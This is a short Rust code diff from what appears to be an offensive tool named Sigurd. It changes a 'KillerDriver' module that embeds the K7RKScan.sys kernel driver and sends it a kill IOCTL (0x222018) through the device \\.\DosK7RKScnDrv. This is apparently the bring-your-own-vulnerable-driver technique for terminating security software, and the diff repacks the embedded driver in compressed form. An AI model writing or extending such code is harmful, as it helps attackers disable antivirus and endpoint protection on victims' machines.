@@ -1,4 +1,5 @@
 use std::ptr::null_mut;
+use include_packed::include_packed;
 
 use winapi::{
     ctypes::c_void, 
@@ -21,8 +22,6 @@ const VERSION: &str = "0.0.1";
 
 const DRIVER_DEVICE: &str = "\\\\.\\DosK7RKScnDrv";
 const IOCTL_KILL: u32 = 0x222018;
-
-static DRIVER: &'static [u8] = include_bytes!("../../../drivers/K7RKScan.sys");
 
 pub struct K7rkscan {
     device: *mut c_void
@@ -79,7 +78,7 @@ impl KillerDriver for K7rkscan {
     }
 
     fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
-        let v = DRIVER.to_vec();
+        let v = include_packed!("drivers/K7RKScan.sys");
         return Ok(v);
     }
 
